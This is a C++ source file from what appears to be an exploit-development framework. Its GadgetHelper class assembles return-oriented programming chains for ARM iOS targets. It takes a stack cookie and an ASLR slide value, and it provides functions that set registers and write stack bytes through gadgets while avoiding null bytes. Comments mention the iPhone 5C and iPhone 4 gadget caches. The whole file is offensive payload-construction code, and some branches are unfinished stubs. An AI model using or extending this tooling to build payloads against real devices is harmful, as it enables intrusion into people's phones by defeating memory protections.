#include "GadgetHelper.h"

// ########################
// gadgethelper.cpp
// ########################

//public:
GadgetHelper::GadgetHelper(uint cookieValue, uint slideValue,
			   const char* fileName, uint maxSize) : 
  BaseGadgets(cookieValue, slideValue, fileName, maxSize)
{
  loadFile(fileName, areZerosAllowed());
}

//protected:

// r0 = X
void GadgetHelper::mov_r0_x(int x) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {mov r0, %d} (0x%x)\n", 
		   __FUNCTION__, x, x);

  if (x == 0) {
	mov_r_0(0);
	return;
  }

  if (!(x & 0xFF)) {
	// not handled (todo) but could do something like
	// adds r0, #1 ; pop {r4, r7, pc}
	exit(printf("Error in mov_r0_x. "
				"x contains a 0. x = %d (0x%x)\n", x, x)); 
  }

  pop(0);
  if (x < 0x100) {
	addBytes(x << 24 | 0xFFFFFF);
	// x cannot be 0 (fixme)
	lsrs_r0_r0_24();
  }
  else if (x == 0x100) {
	// not handled yet (todo)
	exit(printf("Error in mov_r0_x. "
				"x contains a 0. x = %d (0x%x)\n", x, x));
	// addBytes(0xFFFFFF01);
	// lsrs_r0_r0_16();
	// ls_r_8('l', 0);
	// ls_r_8('r', 0);
  }
  else if (x < 0x10000) {
	// handles the case where 1st byte is 0
	addBytes(x << 16 | 0xFFFF);
	lsrs_r0_r0_16();
  }
  else if (x == 0x10000) {
	// not handled yet (todo)
	exit(printf("Error in mov_r0_x. "
				"x contains a 0. x = %d (0x%x)\n", x, x));
	// addBytes(0xFFFFFF01);
	// lsls_r0_r0_16();
	// ls_r_8('l', 0);
	// ls_r_8('r', 0);
  }
  else if (x < 0x1000000) {
	addBytes(x << 8 | 0xFF);
	lsrs_r0_r0_8();
  }
  else if (utils::isThereANull(x)) {
	// not handled yet (todo)
	exit(printf("Error in mov_r0_X. "
				"x contains a 0. x = %d (0x%x)\n", x, x));
  }
}

void GadgetHelper::mov_r1_x(int x) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {mov r0, %d} (0x%x)\n", 
		   __FUNCTION__, x, x);

  if (x == 0) {
	mov_r_0(1);
	return;
  }

  if (!(x & 0xFF)) {
	// not handled (todo) but could do something like
	// adds r0, #1 ; pop {r4, r7, pc}
	exit(printf("Error in mov_r1_x. "
				"x contains a 0. x = %d (0x%x)\n", x, x)); 
  }

  pop(1);
  if (x < 0x10) {
	addBytes(x << 28 | 0xFFFFFFF);
	lsrs_r1_r1_28();
  }
  else if (x < 0x100) {
	exit(printf("Error in mov_r1_X. "
				"x contains a 0. x = %d (0x%x)\n", x, x));
	// gadget below NOT present in iphone 5C cache
	// (but present in iphone 4) 
	//addBytes(x << 24 | 0xFFFFFF);
	//lsrs_r1_r1_24();
  }
  else if (x < 0x1000000 &&
		   !utils::isThereANull_24(x)) {
	addBytes(x << 8 | 0xFF);
	lsrs_r1_r1_8();
  }
  else if (utils::isThereANull(x)) {
	// not handled yet (todo)
	exit(printf("Error in mov_r1_X. "
				"x contains a 0. x = %d (0x%x)\n", x, x));
  }
}

void GadgetHelper::mov_r_x(uint reg, int x)
{
  if (areZerosAllowed()) {
	printf("-> %s: {mov r%d, %d} (0x%x)\n", 
		   __FUNCTION__, reg, x, x);

	pop(reg);
	addBytes(x);
  }
  else {
	if (reg == 0) {
	  mov_r0_x(x);
	}
	else if (reg == 1) {
	  mov_r1_x(x);
	}
	else {
	  // not handled yet (todo)
	  exit(printf("Error in mov_r_X. "
				  "not handled yet. x = %d (0x%x)\n", x, x));
	  
	  // clears r8 (fixme)
	  
	  // not optimized
	  // clears r0 so it is saved in r8
	  //	mov(8, 0);
	  //	mov_r0_x(x);
	  //	mov(reg, 0);
	  // restore r0
	  //	mov(0, 8);
	}
  }
}

// r4 = sp + X
// clears r0
void GadgetHelper::mov_r4_sp_x(int x) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {mov r4, sp, %d}\n", 
		   __FUNCTION__, x);

  // the size retrieved takes the modified size 
  // of the stack into account
  mov_r_x(0, x - getNewSP());
  mov(4, 0);
  add_r4_sp_r4();
}


void GadgetHelper::mov_r_0(uint reg,
						   uint bytes /* = ADDR_SIZE */) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {mov r%d, #0}\n", 
		   __FUNCTION__, reg);

  pop(reg);
  addBytes(0x77777777);

  // bytes can be 1 but no need to do 4 iterations (fixme)
  //  if (bytes == ADDR_SIZE)
  //	bytes /= 2;

  if (reg == 1) {
	for (uint i = 0; i < 2; i++)
	  lsrs_r1_r1_28();
  }
  else if (reg == 0) {
	for (uint i = 0; i < 2; i++)
	  lsrs_r0_r0_16();
  }
  else {
	exit(printf("mov_r_0: reg %d not "
				"supported\n", reg));
  }
}

// *(pc+X) = 0
// only set 1 byte to 0
// clears r1 and r4 (tofix)
void GadgetHelper::str_0_sp_x(int x) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {str #0, [sp + %d]}\n", 
		   __FUNCTION__, x);

  mov_r4_sp_x(x);
  // only set 1 byte to 0
  // takes way less space
  // (it is fine as long as it is only 
  // used for ASCII strings)
  if (!areZerosAllowed())
	mov_r_0(1, 1);
  else
	mov_r_x(1, 0);

  str_r1__r4();
}

// r0-2 = sp + X
// clears r4 and r0 (tofix)
void GadgetHelper::mov_r_sp_x(uint reg, int x) {
  if (DEBUG_PAYLOAD)
	printf("-> %s: {mov r%d, sp, #%d}\n", 
		   __FUNCTION__, reg, x);

  mov_r4_sp_x(x);
  mov(reg, 4);
}
